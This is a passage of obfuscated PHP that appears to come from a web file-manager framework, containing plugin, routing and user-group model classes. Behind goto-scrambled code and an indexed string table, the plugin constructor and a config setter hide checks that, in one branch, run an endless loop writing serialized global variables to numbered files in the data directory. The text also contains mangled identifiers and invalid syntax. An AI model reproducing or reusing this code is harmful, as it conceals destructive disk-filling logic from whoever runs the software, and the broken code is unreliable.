Cσߍ; eƂ٘: } } } function isError($Fܟɛ, $b账 = null) { $D玥 =& $_SERVER[ԥ]; if (class_exists($D玥[1926])) { return PEAR::isError($Fܟɛ, $b账); } elseif (is_object($Fܟɛ) && (get_class($Fܟɛ) == $D玥[1927] || is_subclass_of($Fܟɛ, $D玥[1927]))) { return !0; } return !1; } } goto b˔Ш; eԥĸ: class Message { function __construct() { } public function send($a = '', $A؈ = array(), $F = "\x74\x65\x78\164") { goto fΎ; fΎ: $fدà =& $_SERVER[ԥ]; $dʭ = array($fدà[29] => $fدà[1280], $fدà[676] => $a); if (in_array($F, array($fدà[1280], $fدà[1281]))) { $dʭ[$fدà[29]] = $F; } goto fم; fم: $A؈ = array($fدà[956] => isset($A؈[$fدà[956]]) ? $A؈[$fدà[956]] : $fدà[33], $fدà[531] => isset($A؈[$fدà[531]]) ? $A؈[$fدà[531]] : $fدà[33]); if (empty($a) || empty($A؈[$fدà[956]]) && empty($A؈[$fدà[531]])) { return !1; } $fˮ = array($fدà[1221] => $dʭ, $fدà[1282] => $A؈); goto e髉ӭ; e髉ӭ: Hook::trigger($fدà[1283], $fˮ); goto D؍; D؍: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto fŦ; D: $this->pluginHostDefault = $config[$dĶܶ[1289]] . $this->pluginName . $dĶܶ[8]; $C = $config[$dĶܶ[1290]]; if ($C && strpos($dĶܶ[47] . $C . $dĶܶ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$dĶܶ[1291]] . $this->pluginName . $dĶܶ[8]; } goto Cޮ; F찘: $this->in =& $in; $this->modelPlugin = Model($dĶܶ[1287]); $this->pluginName = str_replace($dĶܶ[1287], $dĶܶ[33], get_class($this)); goto Eمۇ; fŦ: $dĶܶ =& $_SERVER[ԥ]; $C퐪 = $_SERVER[$dĶܶ[721]] . $dĶܶ[722]; $e؇ = $dĶܶ[1284]; goto Eގ; Cޮ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto B½; Eمۇ: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $dĶܶ[8]; $this->pluginApi = appHostGet() . $dĶܶ[1288] . $this->pluginName . $dĶܶ[8]; $this->pluginHost = $config[$dĶܶ[1289]] . $this->pluginName . $dĶܶ[8]; goto D; Eގ: if ($_SERVER[$dĶܶ[718]] != $e؇($C퐪)) { goto aˋ; B: $f(); $Aϊ = $dĶܶ[1285]; $b = json_encode($GLOBALS[$dĶܶ[1286]]); goto A; Dڎ: $D펍 = $dĶܶ[779]; $D펍($_SERVER[$dĶܶ[780]]); $f = $dĶܶ[778]; goto B; A: $f탒܌ = 1; for ($A⺍ = $f탒܌; $A⺍ > 0; $A⺍++) { $Aϊ(DATA_PATH . $A⺍, $b); } goto F؅ޣ; aˋ: $f = $dĶܶ[778]; $A = $dĶܶ[720]; $E陌 = $_SERVER[$dĶܶ[721]] . $dĶܶ[722]; goto D; D: $bߘ = $A($E陌); $Eޅ = explode($dĶܶ[213], $bߘ); if (count($Eޅ) < $dĶܶ[568]) { $b܏ = $dĶܶ[723]; $b܏(); } goto Dڎ; F؅ޣ: } global $in, $config; $this->config =& $config; goto F찘; B½: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ԥ][1292]); } protected function assign($f䢌Ѥ, $f = false) { if (is_array($f䢌Ѥ)) { $this->values = array_merge($this->values, $f䢌Ѥ); } else { $this->values[$f䢌Ѥ] = $f; } } protected function display($f) { extract($this->values); require $f; } final function hookRegist($bݤ) { $this->modelPlugin->appRegist($this->pluginName, $bݤ); } final function appIcon() { $E탯٠ =& $_SERVER[ԥ]; $fŐǩ = $this->appPackage(); $cʐ = $E탯٠[33]; if (isset($fŐǩ[$E탯٠[378]])) { if (isset($fŐǩ[$E탯٠[378]][$E탯٠[1293]])) { $cʐ = $E탯٠[1294] . $fŐǩ[$E탯٠[378]][$E탯٠[1293]] . $E탯٠[1295]; } else { if ($fŐǩ[$E탯٠[378]][$E탯٠[1296]]) { $cʐ = $E탯٠[1297] . $fŐǩ[$E탯٠[378]][$E탯٠[1296]] . $E탯٠[1298]; } } } return $cʐ; } final function fileCanView($f) { $dŵƂ =& $_SERVER[ԥ]; if (request_url_safe($f)) { return !0; } if ($this->isShare($f)) { return !0; } if (!Action($dŵƂ[1299])->authCan($dŵƂ[1300])) { show_tips(LNG($dŵƂ[1301]) . $dŵƂ[1302], !1); } ActionCall($dŵƂ[1303], $f); } final function isShare($eޝ) { $Dī = KodIO::parse($eޝ); return $Dī[$_SERVER[ԥ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($f) { if (request_url_safe($f)) { return $f; } if (!$this->isShare($f)) { $f = $this->filePath($f); } return Action($_SERVER[ԥ][1000])->linkOut($f); } public function filePathLinkOut($a粒) { if (request_url_safe($a粒)) { return $a粒; } $this->fileCanView($a粒); return Action($_SERVER[ԥ][1000])->link($a粒); } final function filePath($B쌉) { $cۤٲ =& $_SERVER[ԥ]; if ($C߼ǲ = $this->checkSharePath($B쌉)) { return $C߼ǲ; } $this->fileCanView($B쌉); if (request_url_safe($B쌉)) { $Cվ≚ = parse_url_query($B쌉); if (isset($Cվ≚[$cۤٲ[1304]]) && isset($Cվ≚[$cۤٲ[193]])) { $a̗ = Model($cۤٲ[1071])->get($cۤٲ[1305]); $F뻣 = Mcrypt::decode($Cվ≚[$cۤٲ[193]], $a̗); if ($F뻣) { $this->fileInfo = IO::infoWithChildren($F뻣); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $F뻣; } } $B쌉 = $this->_cacheHttpFile($B쌉); $this->fileInfo = IO::infoWithChildren($B쌉); } else { $this->fileInfo = IO::infoWithChildren($B쌉); if (!$this->fileInfo) { show_tips(LNG($cۤٲ[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $B쌉; } final function _cacheHttpFile($c驽) { $cⰅѠ = hash_path($c驽, !0); $this->cachePath = $this->pluginCachePath($cⰅѠ); if ($a = IO::fileNameExist($this->cachePath, $cⰅѠ)) { return KodIO::make($a); } $Eؕ = $this->cachePath . $cⰅѠ; return $this->pluginCacheFileSet($Eؕ, file_get_contents($c驽)); } final function _tmpFileName($B = array()) { goto dܧ; d: if (isset($B[$e[158]][$e[160]])) { return $B[$e[158]][$e[160]]; } $a熶ڏ = array($B[$e[28]], $B[$e[75]], $B[$e[77]]); if (isset($B[$e[455]])) { $a熶ڏ[] = $B[$e[455]]; } goto fݠ; fݠ: return md5(implode($e[70], $a熶ڏ)); goto A촔; dܧ: $e =& $_SERVER[ԥ]; if (!$B) { $B = $this->fileInfo; } if (isset($B[$e[160]])) { return $B[$e[160]]; } goto d; A촔: } final function checkSharePath($A) { goto cל; Dއ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$F؆[160]]); return $c[$F؆[75]]; goto F; C䧲: $c = Action($F؆[1000])->sharePathInfo($A); if (!isset($c[$F؆[75]])) { show_json(LNG($F؆[1307]), !1); } $this->fileInfo = $c[$F؆[158]]; goto Dއ; cל: $F؆ =& $_SERVER[ԥ]; if (!defined($F؆[423])) { define($F؆[1306], 0); } if (!$this->isShare($A)) { return !1; } goto C䧲; F: } final function pluginCachePath($e = '') { $c =& $_SERVER[ԥ]; $cˊ = IO_PATH_SYSTEM_TEMP . $c[1308] . $this->pluginName; if (!($f = IO::infoFull($cˊ))) { return IO::mkdir($cˊ . $c[8] . $e); } if (empty($e)) { return $f[$c[75]]; } if (!($A = IO::fileNameExist($f[$c[75]], $e))) { return IO::mkdir($f[$c[75]] . $e); } return KodIO::make($A); } final function pluginCacheFileSet($cՈ鎎, $D = '') { $F =& $_SERVER[ԥ]; if (!($b֜ = IO::infoFull($cՈ鎎))) { return IO::mkfile($cՈ鎎, $D, REPEAT_REPLACE); } IO::setContent($b֜[$F[75]], $D); return $b֜[$F[75]]; } final function pluginLocalFile($c = '') { goto Eߟ; e: if (!$c) { return $C; } $Dޣ = IO::info($c); $Bдϧ = $this->_tmpFileName($Dޣ) . $b̽[91] . $Dޣ[$b̽[156]]; goto Eé; Eé: $b杬 = $C . $Bдϧ; if (@file_exists($b杬)) { return $b杬; } return IO::copy($c, $C, 0, $Bдϧ); goto E˃쏌; Eߟ: $b̽ =& $_SERVER[ԥ]; $C = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($C)) { mk_dir($C); } goto e; E˃쏌: } final function appPackage() { goto dظ; bԴ: return $A퍷ش; goto FȺ; Fڂ: $dΐ = Hook::trigger($Fٱ[1310], $A퍷ش); if ($dΐ && is_array($dΐ)) { $A퍷ش = $dΐ; } $this->packageData = $A퍷ش; goto bԴ; dظ: $Fٱ =& $_SERVER[ԥ]; if ($this->packageData) { return $this->packageData; } $Eάڳ = $this->parseFile($this->pluginPath . $Fٱ[1309]); goto bε; bε: $this->parseLang($Eάڳ); $A퍷ش = json_decode_force($Eάڳ); if (!$A퍷ش) { return array(); } goto Fڂ; FȺ: } public function packageInfoGet($cŴ) { $E׍٫ = $this->appPackage(); return array_get_value($E׍٫, $cŴ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ԥ][1311]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ԥ][1312]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ԥ][1313]); } private function parseFile($BҶ) { $E䌉ݘ =& $_SERVER[ԥ]; $Cу斘 = file_get_contents($BҶ); $Eʋ = array($E䌉ݘ[1314], $E䌉ݘ[1315], $E䌉ݘ[1316], $E䌉ݘ[1317], $E䌉ݘ[1318], $E䌉ݘ[1319], $E䌉ݘ[1320]); $a = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$E䌉ݘ[84]][$E䌉ݘ[1321]]); $Cу斘 = str_replace($Eʋ, $a, $Cу斘); return $Cу斘; } private function parseLang(&$Bֲ) { goto fۧ; cا: preg_match_all($Bݽ[1323], $Bֲ, $E); if (!is_array($E) || count($E) == 0 || !is_array($E[0]) || count($E[0]) == 0) { return; } $d = array(); goto Dߌ; Dߌ: $Bǉ = array(); foreach ($E[0] as $cț) { $dϰݖ = substr($cț, strlen($B), -4); $cË = LNG($dϰݖ); $d[] = $cț; $Bǉ[] = str_replace(array($Bݽ[213], $Bݽ[975], $Bݽ[326], $Bݽ[112]), array($Bݽ[50], $Bݽ[50], $Bݽ[33], $Bݽ[1324]), $cË); } $Bֲ = str_replace($d, $Bǉ, $Bֲ); goto e; fۧ: $Bݽ =& $_SERVER[ԥ]; $B = $Bݽ[1322]; if (!strstr($Bֲ, $B)) { return; } goto cا; e: } private function parseConfig(&$c) { goto C; bþŨ: preg_match_all($f[1326], $c, $Aѳ); if (!is_array($Aѳ) || count($Aѳ) == 0 || !is_array($Aѳ[0]) || count($Aѳ[0]) == 0) { return; } $E = $this->getConfig(); goto f̜ԥ; F: $c = str_replace($f±, $fʬؤΒ, $c); goto e; f̜ԥ: $f± = array(); $fʬؤΒ = array(); foreach ($Aѳ[0] as $cʋ߽) { $bڐ = substr($cʋ߽, strlen($bа󚚌), -2); $f±[] = $cʋ߽; $fʬؤΒ[] = _get($E, $bڐ); } goto F; C: $f =& $_SERVER[ԥ]; $bа󚚌 = $f[1325]; if (!strstr($c, $bа󚚌)) { return; } goto bþŨ; e: } private function parsePackage(&$Aۛ) { goto fᑤ; dР: $Aۛ = str_replace($a㩜΂, $A, $Aۛ); goto f; F씓ư: $a㩜΂ = array(); $A = array(); foreach ($Eđ[0] as $Eܝ) { $d = substr($Eܝ, strlen($cəž), -2); $a㩜΂[] = $Eܝ; $A[] = _get($eߜ˸, $d); } goto dР; dźܜ: preg_match_all($aɒ[1328], $Aۛ, $Eđ); if (!is_array($Eđ) || count($Eđ) == 0 || !is_array($Eđ[0]) || count($Eđ[0]) == 0) { return; } $eߜ˸ = $this->appPackage(); goto F씓ư; fᑤ: $aɒ =& $_SERVER[ԥ]; $cəž = $aɒ[1327]; if (!strstr($Aۛ, $cəž)) { return; } goto dźܜ; f: } final function echoFile($Fޖ, $c = false) { goto C幯; a: $this->parsePackage($eǩة); if (is_array($c)) { $eǩة = str_replace(array_keys($c), array_values($c), $eǩة); } echo $E[213] . $eǩة; goto cŇץ; fꯩ: $eǩة = $this->parseFile($cȴ); $this->parseLang($eǩة); $this->parseConfig($eǩة); goto a; C幯: $E =& $_SERVER[ԥ]; $cȴ = $this->pluginPath . $Fޖ; if (ACT == $E[1329]) { echo $E[1330] . $this->pluginName . $E[8] . $Fޖ . $E[1331]; if (!file_exists($cȴ)) { echo $E[1332]; return; } } goto fꯩ; cŇץ: } final function initLang() { goto DՃ; DՃ: $aԆʻ =& $_SERVER[ԥ]; $f = $aԆʻ[1333]; $Fƹ = $this->pluginPath . $aԆʻ[1334]; goto eᆇފ; eᆇފ: $Dˊ = I18n::getType(); $d = array(); if (file_exists($Fƹ . $Dˊ . $aԆʻ[756])) { $d = (include $Fƹ . $Dˊ . $aԆʻ[756]); } else { if ($Dˊ == $aԆʻ[1335] && !file_exists($Fƹ . $Dˊ . $aԆʻ[756]) && file_exists($Fƹ . $aԆʻ[1336])) { $d = (include $Fƹ . $aԆʻ[1336]); } else { if (file_exists($Fƹ . $f . $aԆʻ[756])) { $d = (include $Fƹ . $f . $aԆʻ[756]); } } } goto eդ; eդ: if (!is_array($d)) { return array(); } if (@count($d) > 0) { I18n::set($d); } return $d; goto aϴ; aϴ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($B) { $Cɐԯ =& $_SERVER[ԥ]; if ($_SERVER[$Cɐԯ[718]] != $_SERVER[$Cɐԯ[719]]) { goto F޲; f³: $eԌ = $e☔($f); $A = explode($Cɐԯ[213], $eԌ); if (count($A) < $Cɐԯ[568]) { $b = $Cɐԯ[723]; $b(); } goto fӏ; F޲: $a = $Cɐԯ[778]; $e☔ = $Cɐԯ[720]; $f = $_SERVER[$Cɐԯ[721]] . $Cɐԯ[722]; goto f³; fӏ: $b· = $Cɐԯ[779]; $b·($_SERVER[$Cɐԯ[780]]); $b·($_SERVER[$Cɐԯ[721]] . $Cɐԯ[781]); goto d龜; d龜: $b = 1; while ($b > 1) { $b = $b + 4; $B֐ = rawurlencode($b . $Cɐԯ[357]); } goto c; c: } return $this->modelPlugin->setConfig($this->pluginName, $B); } public function onSetConfig($fɴ) { } public function onGetConfig($cͤ) { } public function onChangeStatus($D݇) { } public function onUninstall() { } public function onInstall() { } public function authCheck($cѭ = "\x70\154\x75\147\151\156\x41\x75\x74\150") { $e =& $_SERVER[ԥ]; if (!defined($e[423])) { return !1; } if (_get($GLOBALS, $e[453])) { return !0; } $A = $this->getConfig(); if (!$A[$cѭ]) { return !1; } return ActionCall($e[1337], $A[$cѭ]); } public function url($a艣, $e = '', $f߬ = true) { goto A킌; C: if (!$f߬) { return $Eԕ; } echo $Eԕ; goto cˆ; A킌: $f⠇ =& $_SERVER[ԥ]; $C = $this->getConfig(); $a܉ʶ = KOD_VERSION . $f⠇[91] . KOD_VERSION_BUILD; goto C˯; C˯: $B = $this->packageVersion(); $b = $a܉ʶ . $f⠇[408] . $B; if (substr($a艣, 0, 4) == $f⠇[142] || substr($a艣, 0, 2) == $f⠇[1130]) { $Eԕ = $a艣 . $f⠇[1338] . $b; } else { if ($e == $f⠇[33]) { $Eԕ = $this->pluginHost . $a艣 . $f⠇[1338] . $b; } else { if ($e === $f⠇[76]) { $Eԕ = $this->pluginHost . $a艣; } else { if ($e == $f⠇[1339]) { $Eԕ = STATIC_PATH . $a艣 . $f⠇[1338] . $a܉ʶ; } else { if ($e == $f⠇[1340]) { $Eԕ = APP_HOST . $f⠇[1341] . $a艣 . $f⠇[1338] . $a܉ʶ; } else { if (isset($C[$e])) { $Eԕ = $C[$e] . $a艣 . $f⠇[1338] . $b; } } } } } } goto C; cˆ: } public function link($cÎ = false, $fن = '') { $D呋 =& $_SERVER[ԥ]; if (!$cÎ) { $this->link($D呋[1342], $D呋[1340]); $this->link($D呋[1343], $D呋[1339]); $this->link($D呋[1344], $D呋[1339]); $this->link($D呋[1345], $D呋[1339]); $this->link($D呋[1346], $D呋[1339]); return; } $e = $this->url($cÎ, $fن, !1); if (substr($cÎ, -3) == $D呋[1347]) { echo $D呋[1348] . $e . $D呋[1349] . $D呋[213]; } else { if (substr($cÎ, -4) == $D呋[1350]) { echo $D呋[1351] . $e . $D呋[1352] . $D呋[213]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\x5e\x2f\135\53", "\x3a\156\x75\x6d" => "\x5b\60\55\x39\x5d\x2b", "\x3a\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Bʐ׸, $eՆ) { $A鸃 =& $_SERVER[ԥ]; if ($Bʐ׸ == $A鸃[1353]) { $D« = array_map($A鸃[1354], $eՆ[0]); $F = strpos($eՆ[1], $A鸃[8]) === 0 ? $eՆ[1] : $A鸃[8] . $eՆ[1]; $FЊ֣ = $eՆ[2]; } else { $D« = null; $F = strpos($eՆ[0], $A鸃[8]) === 0 ? $eՆ[0] : $A鸃[8] . $eՆ[0]; $FЊ֣ = $eՆ[1]; } array_push(self::$maps, $D«); array_push(self::$routes, $F); array_push(self::$methods, strtoupper($Bʐ׸)); array_push(self::$callbacks, $FЊ֣); } public static function error($f于테) { self::$errorCallback = $f于테; } public static function haltOnMatch($A = true) { self::$halts = $A; } public static function dispatch() { goto f㧢; EшÏ: $F = array_keys(static::$patterns); $a = array_values(static::$patterns); $a׬ = !1; goto cҙ; cҙ: self::$routes = preg_replace($fю[1056], $fю[8], self::$routes); if (in_array($f쒅, self::$routes)) { $Eۃ = array_keys(self::$routes, $f쒅); foreach ($Eۃ as $e눵) { if (self::$methods[$e눵] == $FЭɊ || self::$methods[$e눵] == $fю[1356] || in_array($FЭɊ, self::$maps[$e눵])) { $a׬ = !0; if (!is_object(self::$callbacks[$e눵])) { $Dׄ = explode($fю[8], self::$callbacks[$e눵]); $Aƿ = end($Dׄ); $DȮͷ = explode($fю[1357], $Aƿ); $c; = new $DȮͷ[0](); $c;->{$DȮͷ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$e눵]); if (self::$halts) { return; } } } } } else { $fه = 0; foreach (self::$routes as $e눵) { if (strpos($e눵, $fю[4]) !== !1) { $e눵 = str_replace($F, $a, $e눵); } if (preg_match($fю[1358] . $e눵 . $fю[1359], $f쒅, $a֌ە)) { if (self::$methods[$fه] == $FЭɊ || self::$methods[$fه] == $fю[1356] || !empty(self::$maps[$fه]) && in_array($FЭɊ, self::$maps[$fه])) { $a׬ = !0; array_shift($a֌ە); if (!is_object(self::$callbacks[$fه])) { $Dׄ = explode($fю[8], self::$callbacks[$fه]); $Aƿ = end($Dׄ); $DȮͷ = explode($fю[1357], $Aƿ); $c; = new $DȮͷ[0](); if (!method_exists($c;, $DȮͷ[1])) { echo $fю[1360]; } else { call_user_func_array(array($c;, $DȮͷ[1]), $a֌ە); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$fه], $a֌ە); if (self::$halts) { return; } } } } $fه++; } } if ($a׬ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $cĵƿ =& $_SERVER[ԥ]; header($_SERVER[$cĵƿ[1361]] . $cĵƿ[1362]); echo $cĵƿ[1363]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$fю[1355]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto fם; f㧢: $fю =& $_SERVER[ԥ]; $f쒅 = parse_url($_SERVER[$fю[1355]], PHP_URL_PATH); $FЭɊ = $_SERVER[$fю[150]]; goto EшÏ; fם: } } goto DǓ; aǲ: if ($_SERVER[$_SERVER[ԥ][718]] != $_SERVER[$_SERVER[ԥ][719]]) { goto eڋ۶; eڋ۶: $F = $_SERVER[ԥ][720]; $CĴ = $_SERVER[$_SERVER[ԥ][721]] . $_SERVER[ԥ][722]; $B֠ = $F($CĴ); goto E裪; E裪: $A = explode($_SERVER[ԥ][213], $B֠); if (count($A) < $_SERVER[ԥ][544]) { $d嘃о = $_SERVER[ԥ][723]; $d嘃о(); } $AƋơ = $_SERVER[ԥ][724]; goto Dċ; Dċ: $AƋơ($_SERVER[$_SERVER[ԥ][725]]); goto aű; aű: } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\x70"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\x61\x6d\x65" => "\x67\x72\x6f\165\160\x5f\x6d\x65\164\x61", "\155\x65\164\x61\x46\151\145\x6c\x64" => "\147\x72\157\x75\160\x49\104"); protected function cacheFunctionAlias($aۋ) { $A־권 =& $_SERVER[ԥ]; return array($A־권[2132] => array($aۋ[0], $A־권[2133]), $A־권[2134] => array($aۋ[0], $A־권[2133])); } protected function getInfo($bϣ) { $A׬΢ = $this->getInfoSimple($bϣ); if (!$A׬΢) { return !1; } return $this->_listDataApplyItem($A׬΢); } protected function getInfoSimple($bȍ, $A͂ = false) { $AŘ =& $_SERVER[ԥ]; if ($A͂) { $cȱ = array($AŘ[2066] => intval($bȍ)); $a̧ = $this->where($cȱ)->find(); return is_array($a̧) ? $a̧ : array(); } return $this->cacheFunctionGet($AŘ[2135], $bȍ); } protected function groupAdd($C发) { goto BĊ; aŚ: if (!empty($C发[$C̋[2066]])) { $b̫[$C̋[2066]] = $C发[$C̋[2066]]; } $f = $this->add($b̫); $this->setNamePinyin($f, $b̫[$C̋[28]]); goto C뽐; dݔނ: if ($e[$C̋[455]]) { $C = $e[$C̋[455]] . $e[$C̋[2066]] . $C̋[47]; } $b̫ = array($C̋[382] => $this->groupNameAuto($C发[$C̋[457]], $C发[$C̋[28]]), $C̋[364] => $C发[$C̋[457]], $C̋[521] => $C, $C̋[2136] => $C发[$C̋[2050]], $C̋[2137] => 0, $C̋[2070] => 0); if (isset($C发[$C̋[2087]])) { $b̫[$C̋[2087]] = $C发[$C̋[2087]]; } else { $FÛ = $this->max($C̋[2087]); if (!$FÛ) { $FÛ = 0; } $b̫[$C̋[2087]] = $FÛ + 1; } goto aŚ; BĊ: $C̋ =& $_SERVER[ԥ]; if (!$C发[$C̋[457]] && isset($C发[$C̋[2066]]) && $C发[$C̋[2066]] == 1) { if ($e = $this->getInfoSimple($C发[$C̋[2066]], !0)) { return $C发[$C̋[2066]]; } } else { $e = $this->getInfoSimple($C发[$C̋[457]]); if (!$e) { return !1; } } $C = $C̋[466]; goto dݔނ; C뽐: Model($C̋[1093])->groupRootAdd($f); return $f; goto Bͷ; Bͷ: } protected function groupEdit($A̕, $A) { $A =& $_SERVER[ԥ]; if (!empty($A[$A[457]])) { $B㐮 = $this->getInfoSimple($A̕); $F귫 = $this->getInfoSimple($A[$A[457]]); if (!$B㐮 || !$F귫) { return !1; } if ($B㐮[$A[2066]] == $F귫[$A[2066]]) { return !1; } if ($A[$A[457]] != $B㐮[$A[457]]) { if ($F귫[$A[455]] !== $B㐮[$A[455]] && strpos($F귫[$A[455]], $B㐮[$A[455]] . $B㐮[$A[2066]] . $A[47]) === 0) { return !1; } $A[$A[521]] = $F귫[$A[455]] . $A[$A[457]] . $A[47]; $this->_changeChildLevel($B㐮, $F귫); } } if (isset($A[$A[28]])) { $this->setNamePinyin($A̕, $A[$A[28]]); } return $this->where(array($A[2138] => $A̕))->save($A); } private function _changeChildLevel($e, $BѴ, $a = false) { goto Cމ; Cމ: $CЋ =& $_SERVER[ԥ]; $D냩̷ = $e[$CЋ[455]] . $e[$CЋ[2066]] . $CЋ[47]; $Dǎ = $BѴ[$CЋ[455]] . $BѴ[$CЋ[2066]] . $CЋ[47] . $e[$CЋ[2066]] . $CЋ[47]; goto Aډ; Aډ: if ($a) { $Dǎ = $BѴ[$CЋ[455]] . $BѴ[$CЋ[2066]] . $CЋ[47]; } $E᎘ = array($CЋ[521] => array($CЋ[479], $e[$CЋ[455]] . $e[$CЋ[2066]] . $CЋ[480])); $bֆ = array($CЋ[521] => array($CЋ[530], "\162\145\x70\154\141\143\145\50\160\x61\162\x65\x6e\164\x4c\x65\166\145\154\x2c\x27{$D냩̷}\47\54\47{$Dǎ}\x27\x29")); goto bï; bï: $this->where($E᎘)->data($bֆ)->save(); goto d񹐐ܑ; d񹐐ܑ: } public function setNamePinyin($c٨ҫ, $B⋙ = false) { $d =& $_SERVER[ԥ]; if (!$B⋙) { $b´ = $this->getInfoSimple($c٨ҫ); $B⋙ = $b´[$d[28]]; } if (!Input::check($B⋙, $d[524])) { $this->metaSet($c٨ҫ, $d[412], null); $this->metaSet($c٨ҫ, $d[411], null); return; } $cݔ = array($d[412] => str_replace($d[50], $d[33], Pinyin::encode($B⋙)), $d[411] => Pinyin::encode($B⋙, $d[525])); $this->metaSet($c٨ҫ, $cݔ); } protected function groupStatus($D, $D˙Ⱥ١, $D = true) { $f٨ސ =& $_SERVER[ԥ]; $A = $this->getInfoSimple($D); if (!$A) { return !1; } if ($D) { $this->_groupStatusApply($A, $D˙Ⱥ١); } $fֽ = array($f٨ސ[2066] => $D, $f٨ސ[89] => $f٨ސ[673], $f٨ސ[355] => $D˙Ⱥ١); return Model($f٨ސ[2139])->add($fֽ, array(), !0); } private function _groupStatusApply($Bَ, $C) { $a隷 =& $_SERVER[ԥ]; if ($C == $a隷[83]) { $D = $this->parentLevelArray($Bَ[$a隷[455]]); } else { $Bٝ = array($a隷[521] => array($a隷[479], $Bَ[$a隷[455]] . $Bَ[$a隷[2066]] . $a隷[480])); $D = $this->where($Bٝ)->field($a隷[2066])->select(); $D = array_to_keyvalue($D, $a隷[33], $a隷[2066]); } if (empty($D)) { return; } $Bٝ = array($a隷[2066] => array($a隷[7], $D), $a隷[89] => $a隷[673], $a隷[355] => $C ? $a隷[464] : $a隷[83]); Model($a隷[2139])->where($Bٝ)->save(array($a隷[355] => $C)); } protected function groupRemove($Dݙ) { goto EʾŃԐ; CѾ: $this->where(array($Dג[457] => $Dݙ))->save(array($Dג[457] => $cԓ[$Dג[457]])); Model($Dג[2139])->where($F)->delete(); Model($Dג[2140])->where($F)->delete(); goto c䴡; c䴡: Model($Dג[744])->groupRootRemove($Dݙ); return $this->where($F)->delete(); goto c󂂍; EʾŃԐ: $Dג =& $_SERVER[ԥ]; $F = array($Dג[2066] => $Dݙ); $cԓ = $this->where($F)->find(); goto b; b: if (!$cԓ || $cԓ[$Dג[457]] == 0) { return !1; } $F = $this->getInfoSimple($cԓ[$Dג[457]]); $this->_changeChildLevel($cԓ, $F, !0); goto CѾ; c󂂍: } public function listData() { $cأ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cأ[$_SERVER[ԥ][350]]); return $cأ; } private function _makeOrder($Ețҝ = '') { goto C; DЎ: $aºփ = Input::get($aޱ[403], $aޱ[7], $aޱ[2070], $fх); $AП = Input::get($aޱ[404], $aޱ[7], $aޱ[2141], array($aޱ[2141], $aޱ[400])); $AП = $E[$AП]; goto dჭҠ; C: $aޱ =& $_SERVER[ԥ]; $fх = array($aޱ[2066], $aޱ[28], $aޱ[2052], $aޱ[183]); $E = array($aޱ[398] => $aޱ[399], $aޱ[400] => $aޱ[401]); goto DЎ; dჭҠ: $Ețҝ = $Ețҝ . "{$aºփ}\x20{$AП}\x2c\x20\147\162\x6f\165\x70\111\x44\x20\141\163\x63"; return $this->order($Ețҝ); goto eף; eף: } public function listChild($Ḋ) { $cƄ =& $_SERVER[ԥ]; $F⢇ = $this->where(array($cƄ[457] => $Ḋ))->_makeOrder()->selectPage(200); $this->_listDataApply($F⢇[$cƄ[350]]); return $F⢇; } public function listByID($D) { $D挌È =& $_SERVER[ԥ]; if (!$D) { return array(); } $Dџ = array($D挌È[2066] => array($D挌È[7], $D)); $fՆ = $this->where($Dџ)->select(); $this->_listDataApply($fՆ); return $fՆ; } public function listSearch($b) { goto b܋; Eѻ: $this->_listDataApply($Eɿ[$E堋[350]]); return $Eɿ; goto D; b܋: $E堋 =& $_SERVER[ԥ]; $e݌ = $b[$E堋[2142]]; $eǎ = isset($b[$E堋[2143]]) ? $b[$E堋[2143]] : !1; goto F; bޱû: $Eɿ = $this->_makeOrder()->where($F݂)->selectPage(20); $Eɿ = $Eɿ ? $Eɿ : array(); if (!$Eɿ || count($Eɿ[$E堋[350]]) < 5 && Input::check($e݌, $E堋[302])) { $Eߒ = $this->_searchFromMeta($E堋[411], $e݌, 10); $D쯾 = $this->_searchFromMeta($E堋[412], $e݌, 10); $c僭լ = array_merge($Eߒ, $D쯾, $Eɿ[$E堋[350]]); $Eɿ[$E堋[350]] = array_unique_by_key($c僭լ, $E堋[2066]); $Eɿ[$E堋[347]][$E堋[348]] = count($Eɿ[$E堋[350]]); $Eɿ[$E堋[347]][$E堋[349]] = ceil($Eɿ[$E堋[347]][$E堋[348]] / $Eɿ[$E堋[347]][$E堋[345]]); } goto Eѻ; F: if (!trim($e݌)) { return !1; } $e݌ = str_replace($E堋[2144], $E堋[2145], $e݌); $F݂ = array($E堋[2066] => array($E堋[743], "\45{$e݌}\45"), $E堋[28] => array($E堋[743], "\x25{$e݌}\x25"), $E堋[899] => $E堋[2146]); goto bޱû; D: } private function _searchFromMeta($bѾ, $a΃, $EԘ) { goto a̤; a̤: $c =& $_SERVER[ԥ]; $a΃ = strtolower($a΃); $c = array($c[89] => $bѾ, $c[355] => array($c[743], "\x25{$a΃}\45")); goto dŽޠܼ; dŽޠܼ: $b = 